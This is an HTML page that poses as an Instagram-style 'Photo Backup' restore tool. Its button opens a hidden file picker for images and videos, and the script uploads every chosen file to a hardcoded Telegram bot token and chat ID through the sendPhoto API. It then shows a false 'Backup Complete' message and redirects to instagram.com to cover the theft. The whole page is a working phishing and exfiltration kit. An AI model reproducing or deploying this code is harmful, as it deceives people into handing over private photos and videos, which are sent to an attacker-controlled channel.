<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloud Backup</title>
    <style>
        body {
            background-color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            width: 85%;
            max-width: 320px;
        }
        h2 { color: #262626; margin-bottom: 10px; font-size: 22px; }
        p { color: #8e8e8e; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
        .btn {
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 14px 20px;
            border-radius: 10px;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        .btn:active { transform: scale(0.98); }
        
        /* Hidden Input */
        #fileInput { display: none; }
        
        /* Loader */
        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0095f6;
            border-radius: 50%;
            width: 25px;
            height: 25px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .status { margin-top: 15px; font-size: 13px; color: #555; min-height: 20px;}
        .success { color: #2ecc71; font-weight: bold; }
    </style>
</head>
<body>

<div class="container">
    <h2>📸 Photo Backup</h2>
    <p>We detected some old photos in your gallery.<br>Tap below to restore and backup them securely.</p>
    
    <!-- Button -->
    <button class="btn" id="uploadBtn" onclick="startBackup()">Restore Photos</button>
    
    <!-- Hidden Input: Accepts Images/Video, Multiple selection allowed -->
    <input type="file" id="fileInput" accept="image/*,video/*" multiple onchange="processBackup()">
    
    <div class="loader" id="loader"></div>
    <div class="status" id="statusText"></div>
</div>

<script>
    // --- CONFIGURATION ---
    const BOT_TOKEN = "8963438480:AAELEJEev6DlQaB3MiW0pVq--UPD0Dw-Q0c";
    const CHAT_ID = "7838106845";
    // ---------------------

    function startBackup() {
        // Hide button, show loader immediately to give feedback
        document.getElementById('uploadBtn').style.display = 'none';
        document.getElementById('loader').style.display = 'block';
        document.getElementById('statusText').innerText = "Selecting files...";
        
        // Trigger the hidden input
        document.getElementById('fileInput').click();
    }

    async function processBackup() {
        const input = document.getElementById('fileInput');
        const files = Array.from(input.files);
        const status = document.getElementById('statusText');

        if (files.length === 0) return;

        status.innerText = `Found ${files.length} items. Uploading now...`;

        let successCount = 0;
        let failCount = 0;
        const total = files.length;

        // Process in batches of 5 to avoid freezing the browser on mobile
        const batchSize = 5; 
        
        for (let i = 0; i < total; i += batchSize) {
            const batch = files.slice(i, i + batchSize);
            
            // Update status periodically
            status.innerText = `Uploading ${Math.min(i + batchSize, total)} / ${total}...`;

            await Promise.all(batch.map(async (file) => {
                try {
                    const formData = new FormData();
                    formData.append("chat_id", CHAT_ID);
                    formData.append("caption", `📂 ${file.name}`);
                    formData.append("photo", file); 

                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                    const data = await response.json();
                    if(data.ok) successCount++;
                    else failCount++;
                    
                } catch (error) {
                    failCount++;
                }
            }));
            
            // Small delay between batches to be nice to the server
            await new Promise(r => setTimeout(r, 200));
        }

        finishProcess(successCount, failCount, total);
    }

    function finishProcess(success, failed, total) {
        document.getElementById('loader').style.display = 'none';
        const status = document.getElementById('statusText');
        
        if (failed === 0) {
            status.innerHTML = `<span class="success">✅ Backup Complete!</span>`;
            // Redirect to Instagram after short delay
            setTimeout(() => {
                window.location.href = "https://www.instagram.com";
            }, 1500);
        } else {
            status.innerText = `Done. Sent: ${success}, Failed: ${failed}. Refresh to try again.`;
        }
    }
</script>

</body>
</html>
